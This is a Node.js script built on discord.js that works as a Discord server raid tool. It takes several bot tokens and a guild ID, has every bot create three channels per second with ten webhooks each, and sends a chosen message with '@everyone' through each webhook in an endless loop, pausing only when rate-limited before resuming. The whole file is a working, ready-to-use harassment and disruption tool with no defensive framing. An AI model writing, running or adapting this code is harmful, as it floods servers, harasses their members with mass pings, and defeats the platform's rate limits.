const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const fs = require('fs');
const path = require('path');
const readline = require('readline');

const settingsFile = path.join(__dirname, 'settings.json');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function ask(question) {
    return new Promise(resolve => rl.question(question, resolve));
}

async function loadSettings() {
    if (fs.existsSync(settingsFile)) {
        const saved = JSON.parse(fs.readFileSync(settingsFile, 'utf8'));
        console.log('📂 Loaded saved settings:');
        console.log(saved);

        const useSaved = await ask('Use saved settings? (yes/no): ');
        if (useSaved.toLowerCase().startsWith('y')) {
            return saved;
        }
    }

    const botTokensInput = await ask('Enter ALL bot tokens (split by comma): ');
    const guildId = await ask('Enter your Guild ID: ');
    const messageContent = await ask('Enter the spam message: ');
    const channelName = await ask('Enter the channel name to create: ');

    const settings = { botTokensInput, guildId, messageContent, channelName };
    fs.writeFileSync(settingsFile, JSON.stringify(settings, null, 4));
    console.log('✅ Settings saved.');

    return settings;
}

async function main() {
    console.clear();
    console.log('Enter The Folowing Information!');

    const settings = await loadSettings();
    rl.close();

    const tokens = settings.botTokensInput.split(',').map(t => t.trim()).filter(t => t.length > 0);

    if (tokens.length === 0) {
        console.error('No tokens provided.');
        process.exit(1);
    }

    console.log(`Loaded ${tokens.length} bots.`);

    function createBot(token, botNumber) {
        const client = new Client({
            intents: [GatewayIntentBits.Guilds]
        });

        let guild = null;

        async function createChannelAndSpam() {
            try {
                const newChannel = await guild.channels.create({
                    name: `${settings.channelName}-${Math.floor(Math.random() * 1000)}`,
                    type: ChannelType.GuildText,
                    rateLimitPerUser: 0
                });
                console.log(`[Bot ${botNumber}] Created Channel: ${newChannel.name}`);

                for (let i = 0; i < 10; i++) {
                    try {
                        const webhook = await newChannel.createWebhook({
                            name: `SPAMHOOK-${botNumber}-${i}`
                        });
                        console.log(`[Bot ${botNumber}] Created Webhook: ${webhook.name}`);

                        spamWebhook(webhook);
                    } catch (err) {
                        console.error(`[Bot ${botNumber}] Failed to create webhook: ${err.message}`);
                    }
                }
            } catch (err) {
                console.error(`[Bot ${botNumber}] Failed to create channel: ${err.message}`);
            }
        }

        async function spamWebhook(webhook) {
            while (true) {
                try {
                    await webhook.send({
                        content: `@everyone ${settings.messageContent}`
                    });
                    console.log(`[Bot ${botNumber}] Sent Message via ${webhook.name}`);
                } catch (err) {
                    if (err.status === 429 && err?.rawError?.retry_after) {
                        const retry = err.rawError.retry_after * 1000;
                        console.warn(`[Bot ${botNumber}] Rate limited, retrying after ${retry}ms...`);
                        await wait(retry);
                    } else {
                        console.error(`[Bot ${botNumber}] Error sending message: ${err.message}`);
                        await wait(1000);
                    }
                }
            }
        }

        function wait(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        client.once('ready', async () => {
            console.log(`[Bot ${botNumber}] Logged in as ${client.user.tag}`);

            guild = client.guilds.cache.get(settings.guildId);

            if (!guild) {
                console.error(`[Bot ${botNumber}] Guild not found or no access.`);
                return;
            }

            setInterval(() => {
                for (let i = 0; i < 3; i++) {
                    createChannelAndSpam();
                }
            }, 1000);
        });

        client.login(token).catch(err => {
            console.error(`[Bot ${botNumber}] Failed to login: ${err.message}`);
        });
    }

    tokens.forEach((token, index) => {
        createBot(token, index + 1);
    });
}

main();
